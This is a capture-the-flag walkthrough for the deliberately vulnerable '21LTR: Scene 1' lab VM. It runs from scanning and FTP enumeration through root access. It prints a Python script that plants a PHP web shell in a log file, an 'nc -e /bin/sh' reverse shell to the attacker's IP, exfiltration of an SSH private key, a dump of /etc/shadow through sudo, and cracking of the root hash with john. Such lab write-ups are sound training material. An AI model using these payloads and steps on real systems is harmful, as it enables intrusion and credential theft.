#### 21LTR: Scene 1

- [Attacker Info]()
- [Identify Victim]()
- [Nmap Scan]()
- [Nikto]()
- [Dirb]()
- [Webpage Enum]()
- [FTP Enumeration]()
- [Sniff Network]()
- [Upload Backdoor]()
- [Privilege Escalation]()

###### Attacker Info

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.121  netmask 255.255.255.0  broadcast 192.168.2.255
        inet6 fe80::20c:29ff:fea3:a109  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:a3:a1:09  txqueuelen 1000  (Ethernet)
        RX packets 1217  bytes 80230 (78.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5797  bytes 383598 (374.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

###### Identify Victim

```sh
root@kali:~# netdiscover
 Currently scanning: 192.168.16.0/16   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.2.1     00:50:56:c0:00:03      1      60  VMware, Inc.
 192.168.2.2     00:50:56:f3:d1:e6      1      60  VMware, Inc.
 192.168.2.120   00:0c:29:4a:b1:44      1      60  VMware, Inc.

root@kali:~#
```

###### Nmap Scan

```sh
root@kali:~/21ltr# nmap -sV -sC -oA 21ltr.nmap 192.168.2.120
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-02 16:13 EDT
Nmap scan report for 192.168.2.120
Host is up (0.00024s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.1
22/tcp open  ssh     OpenSSH 5.1 (protocol 1.99)
| ssh-hostkey:
|   2048 c7:4d:e1:27:e9:dc:05:90:a1:94:29:a3:e2:9f:e1:76 (RSA1)
|   1024 64:d6:5b:18:76:63:63:0c:06:19:c3:a1:26:6e:fc:5b (DSA)
|_  2048 21:6a:8d:49:c2:7c:21:72:02:3d:53:18:bd:d7:c6:5f (RSA)
|_sshv1: Server supports SSHv1
80/tcp open  http    Apache httpd 2.2.13 ((Unix) DAV/2 PHP/5.2.10)
|_http-server-header: Apache/2.2.13 (Unix) DAV/2 PHP/5.2.10
|_http-title: Intranet Development Server
MAC Address: 00:0C:29:4A:B1:44 (VMware)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.40 seconds
root@kali:~/21ltr#
```

###### Nikto

```sh
root@kali:~/21ltr# nikto -host http://192.168.2.120
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.2.120
+ Target Hostname:    192.168.2.120
+ Target Port:        80
+ Start Time:         2018-05-02 16:14:45 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.13 (Unix) DAV/2 PHP/5.2.10
+ Retrieved x-powered-by header: PHP/5.2.10
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ PHP/5.2.10 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.
+ Apache/2.2.13 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ 8345 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2018-05-02 16:14:59 (GMT-4) (14 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~/21ltr#
```

###### Dirb

```sh
root@kali:~/21ltr# dirb http://192.168.2.120

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed May  2 16:25:20 2018
URL_BASE: http://192.168.2.120/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.2.120/ ----
+ http://192.168.2.120/cgi-bin/ (CODE:403|SIZE:210)
+ http://192.168.2.120/index.php (CODE:200|SIZE:1323)
==> DIRECTORY: http://192.168.2.120/logs/

---- Entering directory: http://192.168.2.120/logs/ ----

-----------------
END_TIME: Wed May  2 16:25:27 2018
DOWNLOADED: 9224 - FOUND: 2
root@kali:~/21ltr#
```

###### Webpage Enum

![](images/1.png)

```
dev@21ltr.com
```

![](images/2.png)

```
<!-- username:logs password:zg]E-b0]+8:(58G -->
```

###### FTP Enumeration

```sh
root@kali:~/21ltr# ftp 192.168.2.120
Connected to 192.168.2.120.
220 ProFTPD 1.3.1 Server (Intranet Development Server) [192.168.2.120]
Name (192.168.2.120:root): logs
331 Password required for logs
Password:
230 User logs logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 root     root           60 May  2 13:06 .
drwxr-xr-x   2 root     root           60 May  2 13:06 ..
-rwxrwxrwx   1 root     root         1.4k Jun  8  2012 backup_log.php
226 Transfer complete
ftp> get backup_log.php
local: backup_log.php remote: backup_log.php
200 PORT command successful
150 Opening BINARY mode data connection for backup_log.php (1450 bytes)
226 Transfer complete
1450 bytes received in 0.00 secs (15.0307 MB/s)
ftp> exit
221 Goodbye.
root@kali:~/21ltr# ls
21ltr.nmap.gnmap  21ltr.nmap.nmap  21ltr.nmap.xml  backup_log.php
root@kali:~/21ltr#
```

`backup_log.php`

```php
<html>
        <head>
                <title></title>
        </head>
        <body>
                <h2 style="text-align: center">
                        Intranet Dev Server Backup Log</h2>
                        <?php $log = time(); echo '<center><b>GMT time is: '.gmdate('r', $log).'</b></center>'; ?>
                <p>
                        &nbsp;</p>
                <h4>
                        Backup Errors:</h4>
                <p>
                        &nbsp;</p>
        </body>
</html>

Wed, 03 Jan 2012 09:51:42 +0000 from 192.168.2.240: Permission denied
<br><br>
Thu, 04 Jan 2012 13:11:29 +0000 from 192.168.2.240: No Such file or directory
<br><br>
Thu, 04 Jan 2012 13:31:36 +0000 from 192.168.2.240: No space left on device
<br><br>
Thu, 04 Jan 2012 13:41:36 +0000 from 192.168.2.240: No Space left on device
<br><br>
Mon, 16 Feb 2012 17:01:02 +0000 from 192.168.2.240: No Space left on device
<br><br>
Fri, 23 Apr 2012 10:51:07 +0000 from 192.168.2.240: No Space left on device
<br><br>
Fri, 12 May 2012 16:41:32 +0000 from 192.168.2.240: No Space Left on device
<br><br>
```

```
http://192.168.2.120/logs/backup_log.php
```

![](images/3.png)

###### Sniff Network

![](images/4.png)

###### Upload Backdoor

`port-10001.py`

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
target = ('192.168.2.120',10001)

while True:
    try:
        s.connect(target)
        s.sendall(b"<?php echo passthru($_GET['cmd']); ?>")
        break
    except socket.error as e:
	if e.errno != errno.ECONNRESET:
		raise
	pass
```

```
http://192.168.2.120/logs/backup_log.php?cmd=id
```

![](images/5.png)

```
http://192.168.2.120/logs/backup_log.php?cmd=nc+-e+/bin/sh+192.168.2.121+6666
```

![](images/6.png)

```sh
root@kali:~/21ltr# nc -nlvp 6666
listening on [any] 6666 ...
connect to [192.168.2.121] from (UNKNOWN) [192.168.2.120] 59426
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.1$ id
id
uid=80(apache) gid=80(apache) groups=80(apache)
bash-3.1$ ls -l
ls -l
total 4
-rwxrwxrwx 1 root root 1487 May  2 20:50 backup_log.php
bash-3.1$ pwd
pwd
/var/www/htdocs/logs
bash-3.1$ cd /tmp
cd /tmp
bash-3.1$ ls -l
ls -l
total 108
-rw-r--r-- 1 root root 98937 May  2 21:10 backup.tar.gz
bash-3.1$ which python
which python
/usr/bin/python
bash-3.1$ /usr/bin/python -m SimpleHTTPServer
/usr/bin/python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.2.121 - - [02/May/2018 21:14:01] "GET / HTTP/1.1" 200 -
192.168.2.121 - - [02/May/2018 21:14:01] code 404, message File not found
192.168.2.121 - - [02/May/2018 21:14:01] "GET /favicon.ico HTTP/1.1" 404 -
192.168.2.121 - - [02/May/2018 21:14:02] code 404, message File not found
192.168.2.121 - - [02/May/2018 21:14:02] "GET /favicon.ico HTTP/1.1" 404 -
192.168.2.121 - - [02/May/2018 21:14:06] "GET /backup.tar.gz HTTP/1.1" 200 -
```

![](images/7.png)

```sh
root@kali:~/Downloads# ls
backup.tar.gz
root@kali:~/Downloads# tar xvzf backup.tar.gz
media/backup/pxelinux.cfg.tar.gz
root@kali:~/Downloads# ls -l
total 104
-rw-r--r-- 1 root root 98937 May  3 00:14 backup.tar.gz
drwxr-xr-x 3 root root  4096 May  3 00:15 media
root@kali:~/Downloads# cd media/
root@kali:~/Downloads/media# ls -l
total 4
drwxr-xr-x 2 root root 4096 May  3 00:15 backup
root@kali:~/Downloads/media# cd backup/
root@kali:~/Downloads/media/backup# ls -l
total 100
-rwxrwxrwx 1 root root 98776 Jun  2  2012 pxelinux.cfg.tar.gz
root@kali:~/Downloads/media/backup# tar xvzf pxelinux.cfg.tar.gz
pxelinux.cfg/default
pxelinux.cfg/dnsmasq
pxelinux.cfg/pxelinux.0

gzip: stdin: decompression OK, trailing garbage ignored
pxelinux.cfg/start
pxelinux.cfg/web/
pxelinux.cfg/web/conf/
pxelinux.cfg/web/conf/modules.conf
pxelinux.cfg/web/conf/monkey.conf
pxelinux.cfg/web/conf/monkey.deny
pxelinux.cfg/web/conf/monkey.mime
pxelinux.cfg/web/monkey
pxelinux.cfg/web/start
tar: Child returned status 2
tar: Error is not recoverable: exiting now
root@kali:~/Downloads/media/backup# ls -l
total 104
drwxr-xr-x 3 root root  4096 May  3 00:15 pxelinux.cfg
-rwxrwxrwx 1 root root 98776 Jun  2  2012 pxelinux.cfg.tar.gz
root@kali:~/Downloads/media/backup# cd pxelinux.cfg/
root@kali:~/Downloads/media/backup/pxelinux.cfg# ls -l
total 92
-rwxrwxrwx 1 root root   232 Aug  4  2009 default
-rwxrwxrwx 1 root root 64504 Aug  4  2009 dnsmasq
-rwxrwxrwx 1 root root 13936 Aug  4  2009 pxelinux.0
-rwxrwxrwx 1 root root   970 Aug  4  2009 start
drwxrwxrwx 3 root root  4096 Aug  4  2009 web
root@kali:~/Downloads/media/backup/pxelinux.cfg#
```

```sh
root@kali:~# nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.2.121] from (UNKNOWN) [192.168.2.120] 43998
python -c 'import pty; pty.spawn("/bin/bash")'
bash-3.1$ id
id
uid=80(apache) gid=80(apache) groups=80(apache)
bash-3.1$ ^Z
[1]+  Stopped                 nc -nlvp 7777
root@kali:~# echo $TERM
xterm-256color
root@kali:~# stty -a
speed 38400 baud; rows 52; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~# stty raw -echo
root@kali:~# nc -nlvp 7777
                          reset

bash-3.1$ export SHELL=bash
bash-3.1$ export TERM=xterm256-color
bash-3.1$ stty rows 52 columns 204
bash-3.1$ cd /media/
bash-3.1$ ls -lah
total 0
drwxrwxrwx  4 root root  80 Jun  6  2012 .
drwxr-xr-x 93 root root 300 May  2 20:32 ..
drwxrwxrwx  3 root root 120 Jun 19  2012 USB_1
drwxrwxrwx  2 root root  60 Jun  3  2012 backup
bash-3.1$ cd USB_1/
bash-3.1$ ls -lah
total 2.7M
drwxrwxrwx 3 root root  120 Jun 19  2012 .
drwxrwxrwx 4 root root   80 Jun  6  2012 ..
-rwxrwxrwx 1 root root 1.4M Jun 19  2012 ProgrammingGroundUp-1-0-booksize.pdf
-rwxrwxrwx 1 root root 168K Jun 19  2012 SerialProgrammingInPosixOSs.pdf
drwxrwxrwx 3 root root   80 Jun 19  2012 Stuff
-rwxrwxrwx 1 root root 1.2M Jun 19  2012 make.pdf
bash-3.1$ cd ..
bash-3.1$ cd backup/
bash-3.1$ ls -lah
total 108K
drwxrwxrwx 2 root root  60 Jun  3  2012 .
drwxrwxrwx 4 root root  80 Jun  6  2012 ..
-rwxrwxrwx 1 root root 97K Jun  3  2012 pxelinux.cfg.tar.gz
bash-3.1$
bash-3.1$ cd ../USB_1/
bash-3.1$ ls
ProgrammingGroundUp-1-0-booksize.pdf  SerialProgrammingInPosixOSs.pdf  Stuff  make.pdf
bash-3.1$ cd Stuff/
bash-3.1$ ls -l
total 916
drwxrwxrwx 2 root root     80 Jun  6  2012 Keys
-rwxrwxrwx 1 root root 928014 Jun 19  2012 bash.pdf
bash-3.1$ cd Keys/
bash-3.1$ ls
authorized_keys  id_rsa
bash-3.1$
bash-3.1$ python -m SimpleHTTPServer 8090
Serving HTTP on 0.0.0.0 port 8090 ...
192.168.2.121 - - [02/May/2018 22:52:44] "GET / HTTP/1.1" 200 -
192.168.2.121 - - [02/May/2018 22:52:44] code 404, message File not found
192.168.2.121 - - [02/May/2018 22:52:44] "GET /favicon.ico HTTP/1.1" 404 
```

![](images/8.png)

```sh
root@kali:~/21ltr# cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNHCwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+YwuhlcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5Q== hbeale@slax
root@kali:~/21ltr#
root@kali:~/21ltr# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEoQIBAAKCAQEA1pfb/CVukUw4Xe67YLEZzVHWNax0zJjI1CfcsoEGylmmtlA6
iXHi41nLshzXu9n536JfM9LFAWGqefBVX7Bzd/fC4+jHS3q89IK9FP7gFPwEmlNH
CwPX0ADxDFyB1lJOFffJ9gVw3VgHCaCPgS70UqJD0hZFDMSDMoBa91PylFQR0m58
nMq8DsGRbeC5hTdpLXKfBuW8v/lFuNEWVWNcZDie82aiJg8WRUUIrzeGZSR3+cG1
hi6za67VIi+ce8fFuBvIgaEpvJ0JSIX7zPLUV10ezW1NQRNplKSam3TIYI3+Ywuh
lcgpEyliHYReN6v91+um2c6LNy9y/vx2Akci5QIBIwKCAQEAvhF5s3GcchBPLqA/
kCfVBk/MW2zcerM1iLWXlsoNVCOFB+Co4CMKyV4pcd8IOKsfJSlqQ9fwUa5GiUKU
wne2urbf0S1CzdMcY4m9al4W7gPJkACeAnEeO+OTq9zoBvhxDCSc79ju7+7hqXD0
IfZjXyIBjjD7VHOKJWpfMtVTMunBCMqoAMa2veuN6LgDJweQNi7kon4qcj4SghGI
bdBv/Cnk7PMkG+DhafTRWyXGMWFpTHV4BNKv0i+k4lVV1oP9nJnh9jglY4EkD9LD
0Yt2QZt+XMTlxScsjcBpVGc9m4ZrgmRZGV0PTyMuWJtURkDBYPizkiPjjSZfUbyZ
y9QECwKBgQDsR9wLzrQbJIaOX8dG4rEt8pQHdYK7KCM8Bcq45iKKPzeLxchguM3o
+y9nRz5x8RWXWZUMl7PldoqwmrKh6WVCrdJ7mghPTYx3Djhcaf8q5XFTUhZH4xhB
72g1H6+JCECUjAFfjoSTOEswCFKYssgYA22x3fvLGg3S8f0UjjE1xQKBgQDogKVg
iyXCE833evccfrd/otsyVcxNincunAtYDAsqa2ZrjXL3oFwNwfC1CVKPhqDlnG46
M1tiSeYXygPbuPbHzRdu0ZuG7jRxxVdndl52gq/Zt8MKNRD9mdbFRcRMXmMRfaE4
RXdry9eB4rPywfWgJPGNVtOFZP6PRVv+IpoqoQKBgBRArHYKZzWGybRunA1j400U
ytwRYvoZYhsWcHY/nI+Bwu65Lm6wwTE6GgGJw4Yb+olQ0kLoboFh7qFsWHRHNJCv
0DZ66sT4BLm/Y+qp/+275SRmHyq7sZ9AaASNr/XNgeDYzOru9Wu0XjdRK6awPQlf
YSyAvc+UhNeRFbFOBDfPAoGAVlurI9vpc/i6N1mO+/SNTKo0KKOGZfGZ+16H3t/m
496/pEp7KMaIl2VKxuY0m7WpedsEXsKeSRQiQ1mpqWH1QuXG4AS2HCyXIvGG3Uk5
B3JekrH3/HocQO//UJZBmLVX/y6pmI7UlcC9wodnaMuzAPfHbwL+G5qKb7qtI+D3
busCgYATj4y+8msxNWRRNbHWAV7G0OurPDeZJ8F8NDLpM22X8fM08wgGRwkW4fpa
A+J8tN2ibiDqw29W6Rc1/4evAPbo3GR932W/ELOTOpP2yquiwoSxPG+HCLHmDITr
1qGHJRSOiFzo99iS5aQRhUvdl3M0lz1Cort7hjRKUkSWcT02Rw==
-----END RSA PRIVATE KEY-----
root@kali:~/21ltr#
```

```sh
root@kali:~/21ltr# chmod 400 id_rsa
root@kali:~/21ltr#
root@kali:~/21ltr# ssh -i id_rsa hbeale@192.168.2.120
Linux 2.6.27.27.
hbeale@slax:~$
hbeale@slax:~$ sudo -l
User hbeale may run the following commands on this host:
    (root) NOEXEC: /bin/ls, (root) /usr/bin/cat, (root) /usr/bin/more, (root) !/usr/bin/su *root*
    (root) NOPASSWD: /usr/bin/cat
hbeale@slax:~$ sudo cat /etc/shadow
root:$1$VW5E9DmD$deoML8uqU/4HaTmNmfM7G1:15492:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
smmsp:*:9797:0:::::
mysql:*:9797:0:::::
rpc:*:9797:0:::::
sshd:*:9797:0:::::
gdm:*:9797:0:::::
pop:*:9797:0:::::
apache:*:9797:0:::::
messagebus:*:9797:0:::::
haldaemon:*:9797:0:::::
nobody:*:9797:0:::::
hbeale:$1$Z8Re/DmD$t8eQJ8jScifzjYdYTVtgH.:15492:0:99999:7:::
jgreen:$1$kMqE2DmD$wWNbUsJ9klZs4i1wgHTX4.:15492:0:99999:7:::
logs:$1$I960CDNm$MmzH4Jkp.GY5bGdP0rekt1:15492:0:99999:7:::
hbeale@slax:~$
hbeale@slax:~$ sudo cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1:bin:/bin:/bin/false
daemon:x:2:2:daemon:/sbin:/bin/false
adm:x:3:4:adm:/var/log:/bin/false
lp:x:4:7:lp:/var/spool/lpd:/bin/false
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/:/bin/false
news:x:9:13:news:/usr/lib/news:/bin/false
uucp:x:10:14:uucp:/var/spool/uucppublic:/bin/false
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:/bin/false
ftp:x:14:50::/home/ftp:/bin/false
smmsp:x:25:25:smmsp:/var/spool/clientmqueue:/bin/false
mysql:x:27:27:MySQL:/var/lib/mysql:/bin/false
rpc:x:32:32:RPC portmap user:/:/bin/false
sshd:x:33:33:sshd:/:/bin/false
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
apache:x:80:80:User for Apache:/srv/httpd:/bin/false
messagebus:x:81:81:User for D-BUS:/var/run/dbus:/bin/false
haldaemon:x:82:82:User for HAL:/var/run/hald:/bin/false
pop:x:90:90:POP:/:/bin/false
nobody:x:99:99:nobody:/:/bin/false
hbeale:x:1001:10:,,,:/home/hbeale:/bin/bash
jgreen:x:1002:10:,,,:/home/jgreen:/bin/bash
logs:x:1003:100:,,,:/tmp:/bin/bash
hbeale@slax:~$
```

###### Privilege Escalation

```sh
root@kali:/usr/share/wordlists# gunzip rockyou.txt.gz
```

```sh
root@kali:~/21ltr# nano passwd
root@kali:~/21ltr# nano shadow
root@kali:~/21ltr#
root@kali:~/21ltr# unshadow passwd shadow > unshadowed
root@kali:~/21ltr# john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
Created directory: /root/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"
Use the "--format=aix-smd5" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 4x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
formula1         (root)
```

```sh
hbeale@slax:~$ su -
Password: ********
root@slax:~# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),17(audio),18(video),19(cdrom),26(tape),83(plugdev)
root@slax:~# ls -l
total 8
drwx---r-x 2 root root  62 Nov 16  2007 Desktop/
-rwx------ 1 root root 432 Jun  8  2012 backup.sh*
-rwx------ 1 root root 359 Jun  6  2012 log.sh*
root@slax:~#
```

```sh
root@slax:~# cat backup.sh
#!/bin/bash
#-------------------------------------------------------------------
#Author: Howard Beale
#Purpose: To dump /media/backup to backup server
#Version: 1.0
#Date: 03/01/12
#-------------------------------------------------------------------
#
#Compress files on backup drive
#
tar -czvf /tmp/backup.tar.gz /media/backup/*
#
#Send backup file to server
#
nc -q 10 192.168.2.240 10000 < /tmp/backup.tar.gz
#
# End Of Script
root@slax:~#
```

```sh
root@slax:~# cat log.sh
#!/bin/bash
#-------------------------------------------------------------------
#Author: Howard Beale
#Purpsose: To log any backup errors
#Version: 1.0
#Date: 03/01/12
#-------------------------------------------------------------------
#
#Open up port to log error messages
#
nc -w 120 -l -p 10001 >> /srv/httpd/htdocs/logs/backup_log.php
#
# End Of Script
root@slax:~#
```